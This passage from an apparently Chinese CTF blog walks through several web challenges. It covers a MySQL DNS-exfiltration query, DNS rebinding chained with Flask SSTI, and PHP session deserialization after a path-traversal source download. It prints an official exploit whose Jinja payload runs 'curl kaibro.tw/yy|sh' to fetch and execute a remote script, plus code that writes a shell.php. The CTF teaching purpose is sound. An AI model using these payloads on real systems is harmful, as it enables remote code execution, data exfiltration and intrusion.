<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(version()),&#39;.mysql.ztfjd8.ceye.io\\abc&#39;));</span><br></pre></td></tr></table></figure>

<p>通过gopher生成payload放到http头</p>
<p><img src="https://s2.ax1x.com/2019/10/25/Kaqt1I.png" alt="Kaqt1I.png"></p>
<p><img src="https://s2.ax1x.com/2019/10/25/KaqrNQ.png" alt="KaqrNQ.png"></p>
<p>接下来拿flag的过程也就是正常的注入过程了。</p>
<p>需要注意的是规避特殊符号和长度限制，特殊符号可以用hex解决，长度限制可以用substr解决。</p>
<h3 id="KoreaFish"><a href="#KoreaFish" class="headerlink" title="KoreaFish"></a>KoreaFish</h3><p>同样是很有趣的题了，php+python的一个web，考点是Dns重绑定攻击，SSTI注入</p>
<p>index.php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;KoreaFish&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;form action=<span class="string">"/"</span> method=<span class="string">"get"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"🇰🇷🐟"</span> placeholder=<span class="string">"http://54.87.54.87/koreafish?id=1"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'default_socket_timeout'</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$waf = <span class="keyword">array</span>(<span class="string">"@"</span>,<span class="string">"#"</span>,<span class="string">"!"</span>,<span class="string">"$"</span>,<span class="string">"%"</span>,<span class="string">"&lt;"</span>, <span class="string">"*"</span>, <span class="string">"'"</span>, <span class="string">"&amp;"</span>, <span class="string">".."</span>, <span class="string">"localhost"</span>, <span class="string">"file"</span>, <span class="string">"gopher"</span>, <span class="string">"flag"</span>, <span class="string">"information_schema"</span>, <span class="string">"select"</span>, <span class="string">"from"</span>, <span class="string">"sleep"</span>, <span class="string">"user"</span>, <span class="string">"where"</span>, <span class="string">"union"</span>, <span class="string">".php"</span>, <span class="string">"system"</span>, <span class="string">"access.log"</span>, <span class="string">"passwd"</span>, <span class="string">"cmdline"</span>, <span class="string">"exe"</span>, <span class="string">"fd"</span>, <span class="string">"meta-data"</span>);</span><br><span class="line"></span><br><span class="line">$dst = @$_GET[<span class="string">'🇰🇷🐟'</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($dst)) <span class="keyword">exit</span>(<span class="string">"Forbidden"</span>);</span><br><span class="line"></span><br><span class="line">$res = @parse_url($dst);</span><br><span class="line">$ip = @dns_get_record($res[<span class="string">'host'</span>], DNS_A)[<span class="number">0</span>][<span class="string">'ip'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($res[<span class="string">'scheme'</span>] !== <span class="string">'http'</span> &amp;&amp; $res[<span class="string">'scheme'</span>] !== <span class="string">'https'</span>) <span class="keyword">die</span>(<span class="string">"Error"</span>);</span><br><span class="line"><span class="keyword">if</span>(stripos($res[<span class="string">'path'</span>], <span class="string">"korea"</span>) === <span class="keyword">FALSE</span>) <span class="keyword">die</span>(<span class="string">"Error"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($waf); $i++) </span><br><span class="line">    <span class="keyword">if</span>(stripos($dst, $waf[$i]) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;svg/onload=\"alert('發大財!')\"&gt;"</span>.$waf[$i]);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// u can only touch this useless ip :p</span></span><br><span class="line">$dev_ip = <span class="string">"54.87.54.87"</span>;</span><br><span class="line"><span class="keyword">if</span>($ip === $dev_ip) &#123;</span><br><span class="line">    $content = file_get_contents($dst);</span><br><span class="line">    <span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先通过parse_url解析域名拿到对应ip，接下来判断协议，并且判断路径中是否存在korea,如果不存在的话就返回Error，这个限制条件需要我们是http或者https协议，并且在path中有korea，接下来再去检测payload有无waf数组关键字，最后如果$ip等于给定的ip就会通过file_get_contents去访问我们payload。</p>
<p>在上面我们可以发现dns_get_record函数，这是用来获取主机的DNS记录的函数，题目中是通过这个函数先去拿到ip,最后再去file_get_contents我们的域名payload。</p>
<p>那么这里就可以通过dns重绑定攻击来实现第一次拿到的是题目中需要54.87.54.87这个ip，第二次file_get_contents直接去访问我们的payload域名，那么第二次解析的就是127.0.0.1了，这样就可以看到内网的flask服务器了</p>
<p>dns重绑定攻击在线网站（真的好用）</p>
<p><a href="https://lock.cmpxchg8b.com/rebinder.html" target="_blank" rel="noopener">https://lock.cmpxchg8b.com/rebinder.html</a></p>
<p>首先还是先写一下dns重绑定攻击的原理：</p>
<ul>
<li>在我们给浏览器我们想要访问的域名的时候，浏览器通过向DNS服务器发送请求将输入的域名解析为对应的IP</li>
<li>TTL概念：TTL表示DNS里面域名和IP绑定关系的Cache在DNS上存活的最长时间。当请求了这个域名并且通过dns服务器把这个域名解析为对应的ip后，那么这个关系就会被缓存，缓存的时间称为TTL，当缓存失效后，这个域名和ip的关系就会失效，再次请求域名的话，则会重新匹配对应的ip</li>
</ul>
<blockquote>
<p>而dns就是利用这个来实现的。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改通过某种方式对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。</p>
</blockquote>
<p>DNS重绑定攻击最好的TTL时间就是0，第二次访问这个域名直接解析到另一个ip上</p>
<p><img src="https://s2.ax1x.com/2019/10/25/KdqoJH.png" alt="KdqoJH.png"></p>
<p>接着分析flask部分的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, redirect, url_for, session, render_template_string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sanitize</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str.replace(<span class="string">"."</span>, <span class="string">""</span>).replace(<span class="string">"&#123;&#123;"</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/ping')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"pong"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/flag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"🇹🇼"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/koreafish')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">koreafish</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        id = request.args.get(<span class="string">"id"</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'fish.html'</span>, id=id)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">"/error_page?err=no_id.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/koreacat')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cat</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        id = request.args.get(<span class="string">"id"</span>)</span><br><span class="line">        <span class="keyword">if</span> int(id) &gt; <span class="number">5</span> <span class="keyword">or</span> int(id) &lt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">"/error_page?err=id_range.html"</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'cat.html'</span>, id=id)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">"/error_page?err=no_id.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/error_page')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">error</span><span class="params">()</span>:</span></span><br><span class="line">    error_status = request.args.get(<span class="string">"err"</span>)</span><br><span class="line">    err_temp_path = os.path.join(<span class="string">'/var/www/flask/'</span>, <span class="string">'error'</span>, error_status)</span><br><span class="line">    <span class="keyword">with</span> open(err_temp_path, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read().strip()</span><br><span class="line">    <span class="keyword">return</span> render_template_string(sanitize(content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>关键漏洞部分代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/error_page')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">error</span><span class="params">()</span>:</span></span><br><span class="line">    error_status = request.args.get(<span class="string">"err"</span>)</span><br><span class="line">    err_temp_path = os.path.join(<span class="string">'/var/www/flask/'</span>, <span class="string">'error'</span>, error_status)</span><br><span class="line">    <span class="keyword">with</span> open(err_temp_path, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read().strip()</span><br><span class="line">    <span class="keyword">return</span> render_template_string(sanitize(content))</span><br></pre></td></tr></table></figure>

<p>看来这里调用了render_template_string，那么这样是存在SSTI的，跟进sanitize函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sanitize</span><span class="params">(str)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="string">"."</span>, <span class="string">""</span>).replace(<span class="string">"&#123;&#123;"</span>, <span class="string">""</span>)</span><br></pre></td></tr></table></figure>

<p>进行了一些常见的ssti过滤</p>
<p>接着来看这个函数</p>
<p>error_status通过get型参数err进行获取，通过组合拿到文件路径</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">err_temp_path = os.path.join(<span class="string">'/var/www/flask/'</span>, <span class="string">'error'</span>, error_status)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>os.path.join是有一个很有趣的函数</p>
<p>os.path.join()函数</p>
<p>语法：  os.path.join(path1[,path2[,……]])</p>
<p>返回值：将多个路径组合后返回</p>
<p>注：第一个绝对路径之前的参数将被忽略</p>
</blockquote>
<p>有趣的点就是绝对路径之前的参数将被忽略</p>
<p><img src="https://s2.ax1x.com/2019/10/25/KwSYr9.png" alt="KwSYr9.png"></p>
<p>那么接下来找到一个可控文件就可以了，控制里面的内容，通过Flask的这个服务打开这个路径的内容，进行SSTI。</p>
<p>我们可以通过PHP_SESSION_UPLOAD_PROGRESS得到可控数据，成功SSTI。</p>
<p>这里比HITCON2018的 One-line-php-challenge是要舒服一些的，因为在hitcon2018中，orange师傅把这个文件的开头字符限制了，所以必须要通过多次base64-decode才能实现，这个就不用了，直接SSTI就可以了。官方exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> sample, randint</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'http://koreanfish4.balsnctf.com/index.php'</span></span><br><span class="line">sess_name = <span class="string">'iamkaibro'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span>, </span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID='</span> + sess_name</span><br><span class="line">&#125;</span><br><span class="line">// [].__class__===[][<span class="string">'__class__'</span>]  //SSTI过滤Bypass</span><br><span class="line">// &#123;&#123;&#125;&#125;-&gt;&#123;% %&#125; //SSTI过滤Bypassa</span><br><span class="line">payload = <span class="string">"""</span></span><br><span class="line"><span class="string">&#123;% for c in []['__class__']['__base__']['__subclasses__']() %&#125;</span></span><br><span class="line"><span class="string">&#123;% if c['__name__'] == 'catch_warnings' %&#125;</span></span><br><span class="line"><span class="string">&#123;% for b in c['__init__']['__globals__']['values']() %&#125;</span></span><br><span class="line"><span class="string">&#123;% if b['__class__']==&#123;&#125;['__class__'] %&#125;</span></span><br><span class="line"><span class="string">&#123;% if 'eval' in b['keys']() %&#125;</span></span><br><span class="line"><span class="string">&#123;% if b['eval']('__import__("os")\\x2epopen("curl kaibro\\x2etw/yy\\x7csh")') %&#125;&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner1</span><span class="params">(i)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: payload</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        fp = open(<span class="string">'/etc/passwd'</span>, <span class="string">'rb'</span>)</span><br><span class="line">        r = requests.post(HOST, files=&#123;<span class="string">'f'</span>: fp&#125;, data=data, headers=headers)</span><br><span class="line">        fp.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner2</span><span class="params">(i)</span>:</span></span><br><span class="line">    filename = <span class="string">'/var/lib/php/sessions/sess_'</span> + sess_name</span><br><span class="line">    <span class="comment"># print filename</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        url = <span class="string">'&#123;&#125;?%F0%9F%87%B0%F0%9F%87%B7%F0%9F%90%9F=http://36573657.7f000001.rbndr.us:5000//korea/error_page%3Ferr=&#123;&#125;'</span>.format(HOST, filename)</span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        c = r.content</span><br><span class="line">        <span class="keyword">print</span> [c]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    runner = runner1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    runner = runner2</span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">32</span>)</span><br><span class="line">result = pool.map_async( runner, range(<span class="number">32</span>) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>

<h3 id="巅峰极客lol"><a href="#巅峰极客lol" class="headerlink" title="巅峰极客lol"></a>巅峰极客lol</h3><p>这道题的主要问题在于源码的下载，只要下载出来源码，我们就可以看出是session反序列化了。</p>
<p>文件上传上去生成文件如：upload/phpsessid/phpsessid.jpg</p>
<p>同样文件的下载也是通过phpsessid，赛后看源码可以更清楚的看到这一点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($param)</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Download(Upload_DIR.DS.<span class="keyword">$this</span>-&gt;data[<span class="string">'param'</span>]);</span><br><span class="line">    &#125; </span><br><span class="line"><span class="comment">//define('Upload_DIR',Image_DIR.DS.session_id());</span></span><br><span class="line"><span class="comment">//define('Image_DIR',APP_DIR.DS.'upload');</span></span><br></pre></td></tr></table></figure>

<p>那么比如想要下载index.php的话</p>
<p>Payload如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">download&#x2F;index.php</span><br><span class="line"></span><br><span class="line">PHPSESSID&#x3D;upload&#x2F;..&#x2F;..&#x2F;index.php</span><br></pre></td></tr></table></figure>

<p>即可成功下载index.php</p>
<p>在index.php是有其他文件的路劲的，通过上面的方法即可把所有源码下载完毕</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">defined(<span class="string">'DS'</span>) <span class="keyword">or</span> define(<span class="string">'DS'</span>, DIRECTORY_SEPARATOR);</span><br><span class="line">define(<span class="string">'APP_DIR'</span>, realpath(<span class="string">'./'</span>));</span><br><span class="line">define(<span class="string">'Cache_DIR'</span>,APP_DIR.DS.<span class="string">'user'</span>);</span><br><span class="line">define(<span class="string">'View_DIR'</span>,APP_DIR.DS.<span class="string">'app'</span>.DS.<span class="string">'view'</span>);</span><br><span class="line">define(<span class="string">'Core_DIR'</span>,APP_DIR.DS.<span class="string">'core'</span>);</span><br><span class="line">define(<span class="string">'Image_DIR'</span>,APP_DIR.DS.<span class="string">'upload'</span>);</span><br><span class="line"><span class="keyword">include</span>(Core_DIR.DS.<span class="string">'core.php'</span>);</span><br></pre></td></tr></table></figure>

<p>主要漏洞点在于Cache.class.php缓存</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $data;</span><br><span class="line">    <span class="keyword">public</span> $sj;</span><br><span class="line">    <span class="keyword">public</span> $path;</span><br><span class="line">    <span class="keyword">public</span> $html;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'name'</span>]=<span class="keyword">isset</span>($data[<span class="string">'post'</span>][<span class="string">'name'</span>])?$data[<span class="string">'post'</span>][<span class="string">'name'</span>]:<span class="string">''</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'message'</span>]=<span class="keyword">isset</span>($data[<span class="string">'post'</span>][<span class="string">'message'</span>])?$data[<span class="string">'post'</span>][<span class="string">'message'</span>]:<span class="string">''</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'image'</span>]=!<span class="keyword">empty</span>($data[<span class="string">'image'</span>])?$data[<span class="string">'image'</span>]:<span class="string">'/static/images/pic04.jpg'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;path=Cache_DIR.DS.session_id().<span class="string">'.php'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;html=sprintf(<span class="string">'&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;LOL&lt;/title&gt;&lt;meta charset="utf-8" /&gt;&lt;meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" /&gt;&lt;link rel="stylesheet" href="/static/css/main.css" /&gt;&lt;noscript&gt;&lt;link rel="stylesheet" href="/static/css/noscript.css" /&gt;&lt;/noscript&gt;   &lt;/head&gt; &lt;body class="is-preload"&gt;&lt;div id="wrapper"&gt;&lt;header id="header"&gt; &lt;div class="logo"&gt;&lt;span class="icon fa-diamond"&gt;&lt;/span&gt; &lt;/div&gt;  &lt;div class="content"&gt;&lt;div class="inner"&gt;    &lt;h1&gt;Hero of you&lt;/h1&gt;&lt;/div&gt;  &lt;/div&gt;  &lt;nav&gt;&lt;ul&gt;   &lt;li&gt;&lt;a href="#you"&gt;YOU&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;    &lt;/nav&gt;&lt;/header&gt;&lt;div id="main"&gt;&lt;article id="you"&gt;    &lt;h2 class="major" ng-app&gt;%s&lt;/h2&gt;    &lt;span class="image main"&gt;&lt;img src="%s" alt="" /&gt;&lt;/span&gt; &lt;p&gt;%s&lt;/p&gt;&lt;button type="button" onclick=location.href="/download/%s"&gt;下载&lt;/button&gt;&lt;/article&gt;&lt;/div&gt;&lt;footer id="footer"&gt;&lt;/footer&gt;&lt;/div&gt;&lt;script src="/static/js/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="/static/js/browser.min.js"&gt;&lt;/script&gt;&lt;script src="/static/js/breakpoints.min.js"&gt;&lt;/script&gt;&lt;script src="/static/js/util.js"&gt;&lt;/script&gt;&lt;script src="/static/js/main.js"&gt;&lt;/script&gt;&lt;script src="/static/js/angular.js"&gt;&lt;/script&gt;   &lt;/body&gt;&lt;/html&gt;'</span>,substr(<span class="keyword">$this</span>-&gt;data[<span class="string">'name'</span>],<span class="number">0</span>,<span class="number">62</span>),<span class="keyword">$this</span>-&gt;data[<span class="string">'image'</span>],<span class="keyword">$this</span>-&gt;data[<span class="string">'message'</span>],session_id().<span class="string">'.jpg'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(file_put_contents(<span class="keyword">$this</span>-&gt;path,<span class="keyword">$this</span>-&gt;html))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本意看起来像是把上传文件的缓存放到core目录下</p>
<p>直接通过反序列化控制data数据</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $data;</span><br><span class="line">    <span class="keyword">public</span> $sj;</span><br><span class="line">    <span class="keyword">public</span> $path;</span><br><span class="line">    <span class="keyword">public</span> $html;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'name'</span>]=<span class="string">'1'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'message'</span>]=<span class="string">'&lt;?php phpinfo();?&gt;'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'image'</span>]=<span class="string">'1'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;path=<span class="string">"/var/www/html/shell.php"</span>    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(file_put_contents(<span class="keyword">$this</span>-&gt;path,<span class="keyword">$this</span>-&gt;html))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"xx"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span 